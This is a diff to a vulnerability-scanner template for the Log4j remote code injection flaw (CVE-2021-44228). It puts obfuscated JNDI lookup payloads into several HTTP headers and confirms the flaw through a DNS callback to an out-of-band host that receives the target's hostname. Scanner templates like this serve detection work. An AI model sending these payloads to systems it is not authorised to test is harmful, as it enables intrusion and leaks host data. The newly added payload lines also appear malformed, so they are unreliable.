@@ -1,4 +1,5 @@
 id: CVE-2021-44228
+
 info:
   name: Remote code injection in Log4j
   author: melbadry9,dhiyaneshDK,daffainfo
@@ -9,29 +10,39 @@ info:
     - https://www.lunasec.io/docs/blog/log4j-zero-day/
     - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
   tags: cve,cve2021,rce,oast,log4j
+
 requests:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        Authentication: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        User-Agent: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        X-Api-Version: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        Referer: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        X-Forwarded-For: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
+        User-Agent: ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://${hostName}.{{interactsh-url}}/poc}
+        X-Api-Version: ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://${hostName}.{{interactsh-url}}/poc}
+        Referer: ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://${hostName}.{{interactsh-url}}/poc}
+        X-Forwarded-For: ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://${hostName}.{{interactsh-url}}/poc}
+        Authentication: ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://${hostName}.{{interactsh-url}}/poc}
+
+
+
+
+
+
+
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol  # Confirms the DNS Interaction
         words:
           - "dns"
+
       - type: regex
         part: interactsh_request
         regex:
           - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
     extractors:
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
